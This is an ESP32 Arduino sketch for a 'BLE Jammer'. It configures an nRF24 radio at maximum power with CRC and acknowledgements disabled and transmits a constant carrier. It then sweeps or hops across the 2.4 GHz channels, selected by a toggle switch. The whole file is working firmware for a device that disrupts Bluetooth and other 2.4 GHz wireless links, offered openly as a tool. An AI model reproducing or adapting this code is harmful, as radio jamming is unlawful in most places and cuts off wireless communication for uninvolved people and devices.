#include "RF24.h"
#include <ezButton.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Define SPI pins
#define SCK_PIN 14
#define MISO_PIN 12
#define MOSI_PIN 13
#define CSN_PIN 15    
#define CE_PIN 16

// Create an instance of the RF24 class
RF24 radio(CE_PIN, CSN_PIN);

// Create an instance of the SPIClass
SPIClass *spi = nullptr;

byte channel = 45;
unsigned int flag = 0;
ezButton toggleSwitch(33);

void setup(void) {
  // Initialize Serial communication
  Serial.begin(115200);

  // Setup the toggle switch debounce time
  toggleSwitch.setDebounceTime(50);
  
  // Initialize SPI and RF24
  initSPI();
}

void initSPI() {
  // Initialize SPI with custom pins (only once)
  if (spi == nullptr) {
    spi = new SPIClass(VSPI);
    spi->begin(SCK_PIN, MISO_PIN, MOSI_PIN, CSN_PIN);
  }

  // Initialize the radio
  if (radio.begin(spi)) {
    delay(200);
    Serial.println("BLE Jammer is Started !!!");

    // Radio setup
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);   
    radio.setAddressWidth(3);  
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, channel);
  } else {
    Serial.println("BLE Jammer couldn't be started !!!");
  }
}

void updateChannel() {
  // Channel hopping with 2 spacing hopping
  if (flag == 0) {
    channel += 3;
  } else {
    channel -= 3;
  }

  if (channel > 79 && flag == 0) {
    flag = 1;
  } else if (channel < 2 && flag == 1) {
    flag = 0;
  }

  radio.setChannel(channel);
}

void sweepChannels() {
  // Sweep through all 79 channels
  for (int i = 0; i < 79; i++) {
    radio.setChannel(i);
  }
}

void loop(void) {
  // Update toggle switch state
  toggleSwitch.loop();

  // Handle state based on toggle switch
  if (toggleSwitch.isPressed()) {
    // Switch is pressed, use hopping channels
    updateChannel();
  } else {
    // Switch is not pressed, sweep through all channels
    sweepChannels();
  }
}
